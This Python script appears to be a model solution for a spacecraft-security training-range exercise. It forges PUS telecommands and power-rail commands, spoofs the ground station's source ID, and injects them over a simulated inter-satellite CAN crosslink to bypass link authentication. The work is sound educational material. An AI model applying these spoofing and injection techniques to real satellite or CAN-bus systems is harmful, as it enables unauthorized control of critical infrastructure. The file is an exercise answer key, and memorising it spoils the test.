#!/usr/bin/env python3
"""EX-S01 model solution: EX-X01's attack, unchanged, against an authenticated uplink.

THIS FILE IS EX-X01's SOLVER, and the fact that it did not need editing is the exercise. The
spacecraft it is pointed at now verifies a CCSDS 355.0-B-2 MAC and an anti-replay counter on every
frame that arrives on its space link. None of that is on the crosslink, so none of it is on the
path these octets take.

The original description follows, because it is still accurate:

EX-X01 model solution: command a spacecraft from its neighbour's radio.

The attacker holds one spacecraft in the constellation and nothing else. No ground station, no
key, no position on anybody's space link. What that buys is the crosslink - a CAN bus shared by
every COMM in the constellation - and the crosslink reaches every internal node of every
spacecraft, because the whole purpose of a crosslink is to relay for addresses that are not local.

Three shots, in the order the README asks for them:

    --direct    satellite 0's EPS, the EX-B01 command, sent from here
    --honest    satellite 0's OBC, PUS 8 function 1, signed with our own identity
    (default)   the same command with the source id field set to the ground station's


Usage:
    python3 exercises/EX-S01-the-key-that-guards-one-door/solve.py [--direct|--honest|--relay]
"""
import argparse
import socket
import sys
from pathlib import Path

REPO = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(REPO / "src"))

from cuberange import ports                                       # noqa: E402
from cuberange.identity import GROUND_STATIONS, spacecraft        # noqa: E402
from cuberange.proto.csp import encode_packet                     # noqa: E402
from cuberange.proto.pus import PusTc                             # noqa: E402
from cuberange.proto.spacepacket import PacketType, SpacePacket   # noqa: E402

#: PUS 8,1 - perform a function. Function 1 is "set the COMM rail". Same as EX-G02, because it is
#: the same command: what differs is which wire it arrives on and what it claims about itself.
SERVICE_FUNCTION, SUBTYPE_PERFORM = 8, 1
FUNC_SET_COMM_RAIL = 1

#: The OBC's PUS pipe. NOT 17 - libcsp's CSP_PORT_MAX_BIND is 16, and the firmware says why.
CSP_PORT_PUS = 10
CSP_PORT_POWER = 11
SPORT = 20

VICTIM, PEER = 0, 1


def pus_command(source_id: int, state: int, seq: int = 0) -> bytes:
    """The telecommand. `source_id` is the only thing that varies between --honest and the attack.

    There is no transfer frame around this. On the space link a Space Packet travels inside a TC
    transfer frame, which is where the FECF, the sequence number and every anti-replay control in
    this range live. The crosslink carries CSP, and CSP carries the Space Packet directly. That
    is not a shortcut taken by this script: it is what the link is.
    """
    sat = spacecraft(VICTIM)
    app_data = FUNC_SET_COMM_RAIL.to_bytes(2, "big") + bytes([state])
    tc = PusTc(service=SERVICE_FUNCTION, subtype=SUBTYPE_PERFORM,
               source_id=source_id, app_data=app_data)
    return SpacePacket(apid=sat.apid, ptype=PacketType.TC, sec_hdr=True,
                       seq_count=seq, data=tc.encode()).encode()


def power_command(state: int, token: bytes = b"\x00\x00\x00\x00") -> bytes:
    """EX-B01's rail command: [0] opcode, [1] rail, [2] state, [3:7] token."""
    return bytes([1, 0, state]) + token


def inject(frames, port: int) -> None:
    """The injector's line protocol: "<hex can id> <hex data>"."""
    sock = socket.create_connection(("127.0.0.1", port), timeout=5)
    try:
        for frame in frames:
            sock.sendall(f"{frame.can_id:x} {frame.data.hex()}\n".encode())
            print(f"  injected {frame.hex()}")
    finally:
        sock.close()


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    mode = ap.add_mutually_exclusive_group()
    mode.add_argument("--direct", action="store_true",
                      help="satellite 0's EPS, straight from the crosslink (the EX-B01 command)")
    mode.add_argument("--honest", action="store_true",
                      help="satellite 0's OBC, signed with satellite 1's own identity")
    ap.add_argument("--on", action="store_true", help="turn the rail on instead of off")
    ap.add_argument("--port", type=int, default=None, help="crosslink injector port")
    ap.add_argument("--seq", type=int, default=0)
    args = ap.parse_args()

    port = args.port if args.port is not None else ports.crosslink_injector()
    state = 1 if args.on else 0
    victim, peer = spacecraft(VICTIM), spacecraft(PEER)

    #: There is no --relay here on purpose. The crosslink proving itself is the pair of console
    #: lines each COMM writes at boot - `crosslink reached COMM 13 in 1 ms` - which is a real
    #: observation the README opens with. A flag that injected a CSP ping would produce nothing
    #: anyone could see: libcsp answers the ping inside the stack and the firmware logs neither
    #: the request nor the reply. A mode with no observable result teaches nothing.

    if args.direct:
        print(f"EX-B01's command, from the crosslink, to satellite {VICTIM}'s EPS "
              f"(addr {victim.eps})")
        print("  no token: we do not have one, and arriving by a new road did not give us one")
        frames = encode_packet(src=peer.comm, dst=victim.eps, dport=CSP_PORT_POWER,
                               sport=SPORT, payload=power_command(state))
        inject(frames, port)
        print("  watch the EPS console")
        return 0

    source_id = peer.scid if args.honest else GROUND_STATIONS["primary"]
    label = (f"satellite {PEER}'s own identity" if args.honest
             else "the PRIMARY GROUND STATION's identity")
    print(f"PUS 8,1 to satellite {VICTIM}'s OBC (addr {victim.obc}), source id "
          f"0x{source_id:04X} - {label}")
    if not args.honest:
        print(f"  we are satellite {PEER}. The field says we are 0x{source_id:04X}.")
        print("  Nothing in the packet can contradict it.")
    packet = pus_command(source_id, state, seq=args.seq)
    print(f"  space packet: {packet.hex()}")
    print("  no transfer frame, no FECF, no sequence number - none of that is on this link")
    frames = encode_packet(src=peer.comm, dst=victim.obc, dport=CSP_PORT_PUS,
                           sport=SPORT, payload=packet)
    inject(frames, port)
    print("  watch the OBC console, then the EPS console")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
